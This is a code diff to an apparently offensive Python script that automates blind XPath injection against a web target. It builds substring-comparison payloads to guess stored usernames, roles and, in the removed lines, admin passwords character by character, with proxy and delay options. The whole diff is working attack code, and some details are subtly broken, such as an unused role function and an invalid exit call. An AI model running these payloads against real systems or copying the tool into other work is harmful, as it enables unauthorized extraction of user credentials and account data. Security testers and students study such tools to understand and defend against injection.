@@ -76,62 +76,40 @@ def parse_args():
 
     parser.add_argument(
         "--extract",
-        choices=["admin","password","both"],
+        choices=["users"],
         required=True,
-        help="Type of data to extract: admin, password, or both."
+        help="Type of data to extract: users with roles."
     )
 
+    parser.add_argument(
+        "--max-guess",
+        type=int,
+        default=10,
+        help="Maximum guesses for the number of users."
+    )
 
     return parser.parse_args()
 
 
-def search_admin_role(target, delay, proxy=None):
+def search_users_and_role(max_guess, target, delay, proxy=None):
     """
     Only extract `username`s of users where `role='admin'`
-    XPath query: username = ' or substring(//user[role='admin'][1]/username/text(), 1, 1) = 'c' or '
+    XPath query: username = ' or substring(//user[1]/username/text(), 1, 1) = 'c' or '
     """
 
-    admins = []
+    users = []
 
-    consecutive_fails = 0
-    for index in range(1, 10):
-        name = find_admin(index, target, delay, proxy)
+    for index in range(1, max_guess):
+        name = find_user(index, target, delay, proxy)
         if name:
-            admins.append(name)
-            consecutive_fails = 0
+            users.append(name)
         else:
-            consecutive_fails += 1
-            if consecutive_fails >= 3:
-                break
+            break
 
-    return admins    
-
-def search_admin_passwords(target, delay, proxy=None):
-    passwords = []
-    consecutive_fails = 0
-
-    for index in range(1, 10):
-        name = find_password(index, target, delay, proxy)
-        if name:
-            passwords.append(name)
-            consecutive_fails = 0
-        else:
-            consecutive_fails += 1
-            if consecutive_fails >= 3:
-                break
-
-    return passwords    
-
-def search_password_as_admin(admins, target, delay, proxy=None):
-    passwords = []
-    for index, username in enumerate(admins, start=1):
-        password = find_password(index, target, delay, proxy)
-        if password:
-            passwords.append(f"{username} : {password}")
-    return passwords
+    return users    
 
 
-def find_admin(index, target, delay, proxy=None):
+def find_user(index, target, delay, proxy=None):
 
     char_set = get_characters()
 
@@ -156,7 +134,7 @@ def find_admin(index, target, delay, proxy=None):
 
         if not found_character:
             if username:
-                print_final("[+] Final admin username", username)
+                print_final("[+] Final username", username)
                 return username
             else:
                 print(f"[-] No match at index {index}")
@@ -164,7 +142,7 @@ def find_admin(index, target, delay, proxy=None):
 
     return None
 
-def find_password(index, target, delay, proxy=None):
+def find_role(index, target, delay, proxy=None):
 
     char_set = get_characters()
 
@@ -199,7 +177,7 @@ def find_password(index, target, delay, proxy=None):
 
 
 def build_payload(index, pos, char, field="username"):
-    return f"' or substring(//user[role='admin'][{index}]/{field}/text(), {pos}, 1) = '{char}' or '"
+    return f"' or substring(//user[{index}]/{field}/text(), {pos}, 1) = '{char}' or '"
 
 
 def test_char(query_string, target, proxy=None):
@@ -230,14 +208,11 @@ def print_final(label, value):
 def main():
     args = parse_args()
 
-    if args.extract == "admin":
-        data = search_admin_role(args.target, args.delay, args.proxy)
-    elif args.extract == "password":
-        data = search_admin_passwords(args.target, args.delay, args.proxy)
-    elif args.extract == "both":
-        admins = search_admin_role(args.target, args.delay, args.proxy)
-        data = search_password_as_admin(admins,args.target, args.delay, args.proxy)
-
+    if args.extract == "users":
+        data = search_users_and_role(args.max_guess, args.target, args.delay, args.proxy)
+    else:
+        print("Missing choice.")
+        SystemExit.code(0)
 
     if args.output:
         with open(args.output, 'w') as f:
